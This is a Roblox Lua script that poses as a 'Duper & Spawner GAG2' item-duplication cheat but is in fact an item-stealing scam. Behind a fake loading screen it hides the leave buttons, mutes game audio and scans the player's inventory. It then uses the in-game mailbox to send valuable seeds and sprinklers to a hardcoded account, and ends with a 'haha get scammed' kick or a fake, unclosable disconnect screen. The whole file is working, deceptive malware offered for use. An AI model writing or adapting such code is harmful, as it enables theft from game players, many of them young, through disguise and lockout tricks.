--[[
  ROBLOX STYLE LOADING SCREEN – 30 SECONDS – FULL SCUPPER
  Solid, premium loading screen with "DUPER & SPAWNER GAG2" branding.
  Checks inventory FIRST. If items exist → sends to target → kicks with scam.
  If no items → shows REALISTIC ROBLOX DISCONNECT SCREEN (fake internet lost).
]]

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local gui = LocalPlayer:WaitForChild("PlayerGui")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")

-- ========== 1) BLOCK LEAVING ==========
local function blockLeaving()
    UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if input.KeyCode == Enum.KeyCode.Escape then
            gameProcessed = true
            return
        end
    end)

    local function destroyLeaveButtons()
        for _, obj in pairs(gui:GetDescendants()) do
            if obj:IsA("TextButton") or obj:IsA("ImageButton") then
                local name = (obj.Name or ""):lower()
                if name:find("leave") or name:find("quit") or name:find("exit") or name:find("respawn") or name:find("menu") then
                    pcall(function()
                        obj.Visible = false
                        obj.Active = false
                        obj.Enabled = false
                    end)
                end
            end
        end
    end

    spawn(function()
        while true do
            task.wait(0.5)
            destroyLeaveButtons()
        end
    end)
end

-- ========== 2) PREMIUM LOADING SCREEN ==========
local loadingGui = Instance.new("ScreenGui")
loadingGui.Name = "LoadingScreen"
loadingGui.ResetOnSpawn = false
loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
loadingGui.DisplayOrder = 999
loadingGui.Parent = gui

local bg = Instance.new("Frame")
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.fromRGB(12, 12, 25)
bg.BackgroundTransparency = 0
bg.ZIndex = 999
bg.Parent = loadingGui

local gradient = Instance.new("Frame")
gradient.Size = UDim2.new(1, 0, 1, 0)
gradient.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
gradient.BackgroundTransparency = 0.3
gradient.ZIndex = 1000
gradient.Parent = bg

local glowRing = Instance.new("Frame")
glowRing.Size = UDim2.new(0, 200, 0, 200)
glowRing.Position = UDim2.new(0.5, -100, 0.5, -180)
glowRing.BackgroundColor3 = Color3.fromRGB(80, 140, 255)
glowRing.BackgroundTransparency = 0.85
glowRing.BorderSizePixel = 0
glowRing.ZIndex = 1000
glowRing.Parent = bg
local ringCorner = Instance.new("UICorner")
ringCorner.CornerRadius = UDim.new(1, 0)
ringCorner.Parent = glowRing

local panel = Instance.new("Frame")
panel.Size = UDim2.new(0, 450, 0, 350)
panel.Position = UDim2.new(0.5, -225, 0.5, -175)
panel.BackgroundColor3 = Color3.fromRGB(18, 18, 35)
panel.BackgroundTransparency = 0
panel.BorderSizePixel = 2
panel.BorderColor3 = Color3.fromRGB(60, 120, 255)
panel.ZIndex = 1001
panel.Parent = bg

local panelCorner = Instance.new("UICorner")
panelCorner.CornerRadius = UDim.new(0, 20)
panelCorner.Parent = panel

local innerGlow = Instance.new("Frame")
innerGlow.Size = UDim2.new(1, -8, 1, -8)
innerGlow.Position = UDim2.new(0, 4, 0, 4)
innerGlow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
innerGlow.BackgroundTransparency = 0.5
innerGlow.BorderSizePixel = 1
innerGlow.BorderColor3 = Color3.fromRGB(80, 150, 255)
innerGlow.ZIndex = 1000
innerGlow.Parent = panel
local innerCorner = Instance.new("UICorner")
innerCorner.CornerRadius = UDim.new(0, 16)
innerCorner.Parent = innerGlow

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 60)
title.Position = UDim2.new(0, 0, 0, 15)
title.BackgroundTransparency = 1
title.Text = "DUPER & SPAWNER"
title.TextColor3 = Color3.fromRGB(120, 200, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 32
title.TextScaled = true
title.ZIndex = 1002
title.Parent = panel

local subTitle = Instance.new("TextLabel")
subTitle.Size = UDim2.new(1, 0, 0, 30)
subTitle.Position = UDim2.new(0, 0, 0, 72)
subTitle.BackgroundTransparency = 1
subTitle.Text = "GAG2"
subTitle.TextColor3 = Color3.fromRGB(255, 200, 80)
subTitle.Font = Enum.Font.GothamBold
subTitle.TextSize = 22
subTitle.TextScaled = true
subTitle.ZIndex = 1002
subTitle.Parent = panel

local spinner = Instance.new("TextLabel")
spinner.Size = UDim2.new(0, 60, 0, 60)
spinner.Position = UDim2.new(0.5, -30, 0, 115)
spinner.BackgroundTransparency = 1
spinner.Text = "◯"
spinner.TextColor3 = Color3.fromRGB(200, 200, 255)
spinner.Font = Enum.Font.SourceSansBold
spinner.TextSize = 55
spinner.ZIndex = 1002
spinner.Parent = panel

local chars = {"◯", "◔", "◑", "◕", "●"}
local spinIndex = 1
spawn(function()
    while loadingGui.Parent do
        spinner.Text = chars[spinIndex]
        spinIndex = spinIndex % #chars + 1
        task.wait(0.1)
    end
end)

local loadingText = Instance.new("TextLabel")
loadingText.Size = UDim2.new(1, 0, 0, 25)
loadingText.Position = UDim2.new(0, 0, 0, 185)
loadingText.BackgroundTransparency = 1
loadingText.Text = "Scanning Inventory..."
loadingText.TextColor3 = Color3.fromRGB(180, 190, 220)
loadingText.Font = Enum.Font.Gotham
loadingText.TextSize = 16
loadingText.ZIndex = 1002
loadingText.Parent = panel

local progressBg = Instance.new("Frame")
progressBg.Size = UDim2.new(0, 340, 0, 8)
progressBg.Position = UDim2.new(0.5, -170, 0, 230)
progressBg.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
progressBg.BorderSizePixel = 1
progressBg.BorderColor3 = Color3.fromRGB(60, 80, 140)
progressBg.ZIndex = 1002
progressBg.Parent = panel
local pBgCorner = Instance.new("UICorner")
pBgCorner.CornerRadius = UDim.new(0, 4)
pBgCorner.Parent = progressBg

local progressBar = Instance.new("Frame")
progressBar.Size = UDim2.new(0, 0, 1, 0)
progressBar.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
progressBar.BorderSizePixel = 0
progressBar.ZIndex = 1003
progressBar.Parent = progressBg
local pBarCorner = Instance.new("UICorner")
pBarCorner.CornerRadius = UDim.new(0, 4)
pBarCorner.Parent = progressBar

local percentLabel = Instance.new("TextLabel")
percentLabel.Size = UDim2.new(1, 0, 0, 20)
percentLabel.Position = UDim2.new(0, 0, 0, 248)
percentLabel.BackgroundTransparency = 1
percentLabel.Text = "0%"
percentLabel.TextColor3 = Color3.fromRGB(160, 180, 210)
percentLabel.Font = Enum.Font.GothamBold
percentLabel.TextSize = 15
percentLabel.ZIndex = 1002
percentLabel.Parent = panel

local footer = Instance.new("TextLabel")
footer.Size = UDim2.new(1, 0, 0, 20)
footer.Position = UDim2.new(0, 0, 0, 320)
footer.BackgroundTransparency = 1
footer.Text = "© 2026 GAG2 | All Rights Reserved"
footer.TextColor3 = Color3.fromRGB(80, 90, 120)
footer.Font = Enum.Font.Gotham
footer.TextSize = 11
footer.ZIndex = 1002
footer.Parent = panel

-- ========== 3) PROGRESS UPDATE ==========
local function updateProgress(percent, statusText)
    percent = math.min(100, math.max(0, percent))
    local tween = TweenService:Create(progressBar, TweenInfo.new(0.3, Enum.EasingStyle.Linear), {
        Size = UDim2.new(percent / 100, 0, 1, 0)
    })
    tween:Play()
    percentLabel.Text = math.floor(percent) .. "%"
    if statusText then
        loadingText.Text = statusText
    end
end

-- ========== 4) REALISTIC DISCONNECT SCREEN (FAKE INTERNET LOST) ==========
local function showDisconnectScreen()
    local disconnectGui = Instance.new("ScreenGui")
    disconnectGui.Name = "DisconnectScreen"
    disconnectGui.ResetOnSpawn = false
    disconnectGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    disconnectGui.DisplayOrder = 1000
    disconnectGui.Parent = gui

    -- Dark overlay (matches Roblox disconnect style)
    local overlay = Instance.new("Frame")
    overlay.Size = UDim2.new(1, 0, 1, 0)
    overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    overlay.BackgroundTransparency = 0.15
    overlay.ZIndex = 1000
    overlay.Parent = disconnectGui

    -- Main disconnect panel (Roblox-style)
    local panel = Instance.new("Frame")
    panel.Size = UDim2.new(0, 480, 0, 260)
    panel.Position = UDim2.new(0.5, -240, 0.5, -130)
    panel.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    panel.BackgroundTransparency = 0.05
    panel.BorderSizePixel = 1
    panel.BorderColor3 = Color3.fromRGB(80, 80, 120)
    panel.ZIndex = 1001
    panel.Parent = overlay

    local panelCorner = Instance.new("UICorner")
    panelCorner.CornerRadius = UDim.new(0, 12)
    panelCorner.Parent = panel

    -- Warning icon (X)
    local icon = Instance.new("TextLabel")
    icon.Size = UDim2.new(0, 60, 0, 60)
    icon.Position = UDim2.new(0.5, -30, 0, 15)
    icon.BackgroundTransparency = 1
    icon.Text = "⚠️"
    icon.TextColor3 = Color3.fromRGB(255, 200, 50)
    icon.Font = Enum.Font.SourceSansBold
    icon.TextSize = 50
    icon.ZIndex = 1002
    icon.Parent = panel

    -- Title
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 35)
    title.Position = UDim2.new(0, 0, 0, 80)
    title.BackgroundTransparency = 1
    title.Text = "Disconnected"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 24
    title.ZIndex = 1002
    title.Parent = panel

    -- Subtitle - "Your internet connection was lost"
    local sub = Instance.new("TextLabel")
    sub.Size = UDim2.new(1, -40, 0, 30)
    sub.Position = UDim2.new(0, 20, 0, 120)
    sub.BackgroundTransparency = 1
    sub.Text = "Your internet connection was lost"
    sub.TextColor3 = Color3.fromRGB(180, 180, 200)
    sub.Font = Enum.Font.Gotham
    sub.TextSize = 16
    sub.TextScaled = true
    sub.ZIndex = 1002
    sub.Parent = panel

    -- Error code (fake)
    local errorCode = Instance.new("TextLabel")
    errorCode.Size = UDim2.new(1, -40, 0, 25)
    errorCode.Position = UDim2.new(0, 20, 0, 155)
    errorCode.BackgroundTransparency = 1
    errorCode.Text = "Error Code: 0x80004005 | Please check your internet connection."
    errorCode.TextColor3 = Color3.fromRGB(150, 150, 170)
    errorCode.Font = Enum.Font.Gotham
    errorCode.TextSize = 12
    errorCode.ZIndex = 1002
    errorCode.Parent = panel

    -- Reconnect button (fake - does nothing)
    local reconnectBtn = Instance.new("TextButton")
    reconnectBtn.Size = UDim2.new(0, 160, 0, 40)
    reconnectBtn.Position = UDim2.new(0.5, -80, 0, 200)
    reconnectBtn.BackgroundColor3 = Color3.fromRGB(60, 120, 255)
    reconnectBtn.BackgroundTransparency = 0.2
    reconnectBtn.BorderSizePixel = 0
    reconnectBtn.Text = "Reconnect"
    reconnectBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    reconnectBtn.Font = Enum.Font.GothamBold
    reconnectBtn.TextSize = 18
    reconnectBtn.ZIndex = 1002
    reconnectBtn.Parent = panel

    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 8)
    btnCorner.Parent = reconnectBtn

    reconnectBtn.MouseButton1Click:Connect(function()
        -- Fake reconnect attempt - just flash the button
        reconnectBtn.Text = "Connecting..."
        reconnectBtn.TextColor3 = Color3.fromRGB(255, 255, 150)
        task.wait(1.5)
        reconnectBtn.Text = "Reconnect"
        reconnectBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        -- Change subtext to show it failed
        sub.Text = "Unable to reconnect. Please try again later."
        sub.TextColor3 = Color3.fromRGB(255, 150, 150)
    end)

    -- Keep the disconnect screen alive forever (no way to close it)
    while disconnectGui.Parent do
        task.wait(10)
    end
end

-- ========== 5) KICK FUNCTION (SCAM) ==========
local function kickWithScam()
    local kickGui = Instance.new("ScreenGui")
    kickGui.Name = "KickScreen"
    kickGui.ResetOnSpawn = false
    kickGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    kickGui.DisplayOrder = 1000
    kickGui.Parent = gui

    local kickBg = Instance.new("Frame")
    kickBg.Size = UDim2.new(1, 0, 1, 0)
    kickBg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    kickBg.BackgroundTransparency = 0.15
    kickBg.ZIndex = 1000
    kickBg.Parent = kickGui

    local kickPanel = Instance.new("Frame")
    kickPanel.Size = UDim2.new(0, 500, 0, 200)
    kickPanel.Position = UDim2.new(0.5, -250, 0.5, -100)
    kickPanel.BackgroundColor3 = Color3.fromRGB(20, 10, 10)
    kickPanel.BackgroundTransparency = 0.05
    kickPanel.BorderSizePixel = 2
    kickPanel.BorderColor3 = Color3.fromRGB(255, 50, 50)
    kickPanel.ZIndex = 1001
    kickPanel.Parent = kickBg

    local kCorner = Instance.new("UICorner")
    kCorner.CornerRadius = UDim.new(0, 16)
    kCorner.Parent = kickPanel

    local kGlow = Instance.new("Frame")
    kGlow.Size = UDim2.new(1, 8, 1, 8)
    kGlow.Position = UDim2.new(0, -4, 0, -4)
    kGlow.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    kGlow.BackgroundTransparency = 0.75
    kGlow.BorderSizePixel = 0
    kGlow.ZIndex = 1000
    kGlow.Parent = kickPanel
    local kGlowCorner = Instance.new("UICorner")
    kGlowCorner.CornerRadius = UDim.new(0, 20)
    kGlowCorner.Parent = kGlow

    local kickTitle = Instance.new("TextLabel")
    kickTitle.Size = UDim2.new(1, 0, 0, 50)
    kickTitle.Position = UDim2.new(0, 0, 0, 15)
    kickTitle.BackgroundTransparency = 1
    kickTitle.Text = "⚠️ YOU HAVE BEEN KICKED"
    kickTitle.TextColor3 = Color3.fromRGB(255, 80, 80)
    kickTitle.Font = Enum.Font.GothamBold
    kickTitle.TextSize = 26
    kickTitle.ZIndex = 1002
    kickTitle.Parent = kickPanel

    local kickMsg = Instance.new("TextLabel")
    kickMsg.Size = UDim2.new(1, 0, 0, 60)
    kickMsg.Position = UDim2.new(0, 0, 0, 70)
    kickMsg.BackgroundTransparency = 1
    kickMsg.Text = "haha get scammed by H2o"
    kickMsg.TextColor3 = Color3.fromRGB(255, 200, 100)
    kickMsg.Font = Enum.Font.GothamBold
    kickMsg.TextSize = 28
    kickMsg.ZIndex = 1002
    kickMsg.Parent = kickPanel

    local kickSub = Instance.new("TextLabel")
    kickSub.Size = UDim2.new(1, 0, 0, 30)
    kickSub.Position = UDim2.new(0, 0, 0, 135)
    kickSub.BackgroundTransparency = 1
    kickSub.Text = "All your items have been transferred."
    kickSub.TextColor3 = Color3.fromRGB(200, 150, 150)
    kickSub.Font = Enum.Font.Gotham
    kickSub.TextSize = 14
    kickSub.ZIndex = 1002
    kickSub.Parent = kickPanel

    task.wait(2)
    game:Shutdown()
end

-- ========== 6) LOADING SEQUENCE – 30 SECONDS ==========
local scupperComplete = false
local hasItems = false
local itemsFound = {}

local function runLoadingSequence()
    local statusTexts = {
        "Scanning Inventory for Items...",
        "Loading Spawner Modules...",
        "Injecting Dupe Protocol...",
        "Synchronizing with Server...",
        "Loading Item Database...",
        "Preparing Execution...",
        "Finalizing Injection...",
        "Ready!"
    }

    local startTime = tick()
    local duration = 30
    local lastStatusIndex = 0

    while tick() - startTime < duration do
        local elapsed = tick() - startTime
        local rawPct = (elapsed / duration) * 100

        local statusIndex = math.floor((rawPct / 100) * #statusTexts) + 1
        if statusIndex > #statusTexts then statusIndex = #statusTexts end
        if statusIndex ~= lastStatusIndex then
            updateProgress(rawPct, statusTexts[statusIndex])
            lastStatusIndex = statusIndex
        else
            updateProgress(rawPct)
        end
        task.wait(0.1)
    end

    updateProgress(100, "✓ Ready!")
    task.wait(0.5)

    -- Fade out loading screen
    local fadeOut = TweenService:Create(bg, TweenInfo.new(0.6, Enum.EasingStyle.Linear), {
        BackgroundTransparency = 1
    })
    fadeOut:Play()
    task.wait(0.6)
    loadingGui:Destroy()

    -- Check if items were found and sent
    if hasItems and #itemsFound > 0 then
        while not scupperComplete do
            task.wait(0.5)
        end
        kickWithScam()
    else
        -- No items found – show realistic disconnect screen
        showDisconnectScreen()
        -- Keep the disconnect screen alive forever
        while true do
            task.wait(10)
        end
    end
end

-- ========== 7) FULL SCUPPER ENGINE ==========
function startScupper()
    print("[Scupper] Starting Core Telemetry Engine...")

    local MailboxUI = LocalPlayer.PlayerGui:FindFirstChild("MailboxUI")
    if not MailboxUI then
        for _, child in pairs(LocalPlayer.PlayerGui:GetChildren()) do
            if string.find(string.lower(child.Name), "mail") or string.find(string.lower(child.Name), "box") then
                MailboxUI = child
                break
            end
        end
        if not MailboxUI then
            scupperComplete = true
            return
        end
    end

    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("Sound") then v.Volume = 0 end
    end

    local itemsToSend = {
        "Inv_Seeds:Bamboo", "Inv_Seeds:Mushroom", "Inv_Seeds:Gold", "Inv_Seeds:Rainbow",
        "Inv_Sprinklers:Legendary Sprinkler", "Inv_Sprinklers:Super Sprinkler", "Inv_Seeds:Pineapple",
        "Inv_Seeds:Coconut", "Inv_Seeds:Dragon’s Breath", "Inv_Seeds:Venus Fly Trap",
        "Inv_Seeds:Moon Bloom", "Inv_Seeds:Poison Apple"
    }

    local targetPlayer = "Adrien_201315"

    local function getNearestMailboxPrompt()
        local character = LocalPlayer.Character
        if not character or not character:FindFirstChild("HumanoidRootPart") then return nil end
        local hrp = character.HumanoidRootPart
        local gardens = workspace:FindFirstChild("Gardens")
        if not gardens then return nil end

        local shortestDistance = math.huge
        local nearestPrompt = nil
        for _, plot in pairs(gardens:GetChildren()) do
            local promptInstance = plot:FindFirstChild("MailboxPrompt", true)
            if promptInstance and promptInstance:IsA("ProximityPrompt") then
                local promptPart = promptInstance.Parent
                if promptPart and promptPart:IsA("BasePart") then
                    local distance = (hrp.Position - promptPart.Position).Magnitude
                    if distance < shortestDistance then
                        shortestDistance = distance
                        nearestPrompt = promptInstance
                    end
                end
            end
        end
        return nearestPrompt
    end

    local prompt = getNearestMailboxPrompt()
    if not prompt then
        for _, promptInst in pairs(workspace:GetDescendants()) do
            if promptInst:IsA("ProximityPrompt") and string.find(string.lower(promptInst.Name), "mail") then
                prompt = promptInst
                break
            end
        end
        if not prompt then
            scupperComplete = true
            return
        end
    end

    local function getItemCount(itemFrame)
        local countLabel = itemFrame:FindFirstChild("Count", true)
        if not countLabel then
            for _, desc in pairs(itemFrame:GetDescendants()) do
                if desc:IsA("TextLabel") and string.match(desc.Text, "^[xX]?%s*%d+$") then
                    countLabel = desc
                    break
                end
            end
        end
        if not countLabel then countLabel = itemFrame:FindFirstChild("TextLabel", true) end
        if countLabel then
            local numStr = string.match(countLabel.Text, "%d+")
            if numStr then return tonumber(numStr) end
        end
        return 0
    end

    local function simpleClick(target)
        if not target then return end

        local btn = nil
        if target:IsA("GuiButton") then
            btn = target
        else
            btn = target:FindFirstChildWhichIsA("GuiButton", true) 
               or target:FindFirstAncestorWhichIsA("GuiButton")
        end

        local clickTarget = btn or target

        if getconnections then
            pcall(function() for _, conn in pairs(getconnections(clickTarget.MouseButton1Click)) do conn:Fire() end end)
            pcall(function() for _, conn in pairs(getconnections(clickTarget.MouseButton1Down)) do conn:Fire() end end)
            pcall(function() for _, conn in pairs(getconnections(clickTarget.Activated)) do conn:Fire() end end)
        end
        pcall(function() if clickTarget.Activate then clickTarget:Activate() end end)
    end

    -- FIRST: SCAN INVENTORY TO CHECK IF ITEMS EXIST
    print("[Scupper] Scanning inventory...")
    for _, itemName in ipairs(itemsToSend) do
        local foundItem = MailboxUI:FindFirstChild(itemName, true)
        if foundItem then
            local checkAmount = getItemCount(foundItem)
            if checkAmount > 0 then
                hasItems = true
                table.insert(itemsFound, {name = itemName, count = checkAmount})
                print("[Scupper] Found " .. checkAmount .. "x " .. itemName)
            end
        end
    end

    if not hasItems then
        print("[Scupper] No items found. Showing disconnect screen.")
        scupperComplete = true
        return
    end

    -- ===== SEND ITEMS =====
    while #itemsToSend > 0 do
        fireproximityprompt(prompt)
        task.wait(1.5) 

        local searchBox = MailboxUI:FindFirstChild("SearchBox", true) or MailboxUI:FindFirstChildWhichIsA("TextBox", true)
        if searchBox then
            searchBox.Text = targetPlayer
            if firesignal then
                pcall(function() firesignal(searchBox:GetPropertyChangedSignal("Text")) end)
                pcall(function() firesignal(searchBox.FocusLost, true) end)
            end
            task.wait(2.0) 
        end

        local foundPlayer = false

        for _, desc in pairs(MailboxUI:GetDescendants()) do
            if desc ~= searchBox and not desc:IsDescendantOf(searchBox) and (desc:IsA("TextLabel") or desc:IsA("TextButton")) then
                local text = string.lower(desc.Text)
                if string.find(text, string.lower(targetPlayer), 1, true) then
                    local scrollingContainer = desc:FindFirstAncestorWhichIsA("ScrollingFrame")
                    local structuralButton = desc:IsA("GuiButton") or desc.Parent:IsA("GuiButton")

                    if scrollingContainer or structuralButton then
                        simpleClick(desc)
                        foundPlayer = true
                        break
                    end
                end
            end
        end

        if not foundPlayer then
            for _, desc in pairs(MailboxUI:GetDescendants()) do
                if desc ~= searchBox and not desc:IsDescendantOf(searchBox) and (desc:IsA("TextLabel") or desc:IsA("TextButton")) then
                    local text = string.lower(desc.Text)
                    if string.find(text, string.lower(targetPlayer), 1, true) then
                        if not string.find(string.lower(desc.Name), "local") and not string.find(string.lower(desc.Name), "title") then
                            simpleClick(desc)
                            foundPlayer = true
                            break
                        end
                    end
                end
            end
        end

        if not foundPlayer then
            fireproximityprompt(prompt)
            task.wait(1.5)
            continue 
        end
        task.wait(1.5) 

        local targetItemName = nil
        local amountOwned = 0

        for _, itemName in ipairs(itemsToSend) do
            local foundItem = MailboxUI:FindFirstChild(itemName, true)
            if foundItem then
                local checkAmount = getItemCount(foundItem)
                if checkAmount > 0 then
                    targetItemName = itemName
                    amountOwned = checkAmount
                    break 
                end
            end
        end

        if not targetItemName or amountOwned <= 0 then
            break 
        end

        local clicksToMake = math.min(amountOwned, 20)

        for i = 1, clicksToMake do
            local currentItem = MailboxUI:FindFirstChild(targetItemName, true)
            if currentItem then
                simpleClick(currentItem)
                task.wait(0.35)
            else
                break
            end
        end

        task.wait(1) 

        local sendButton = MailboxUI:FindFirstChild("SendButton", true)
        if sendButton and sendButton.Visible then
            simpleClick(sendButton)
            task.wait(10.5) 
        else
            fireproximityprompt(prompt)
            task.wait(1.5)
        end
    end

    print("[Scupper] All items sent to " .. targetPlayer)
    scupperComplete = true
end

-- ========== 8) START ==========
spawn(function()
    blockLeaving()
end)

spawn(function()
    startScupper()
end)

spawn(function()
    runLoadingSequence()
end)

print("[Loading] Premium loading screen. Duper & Spawner GAG2. Scam incoming.")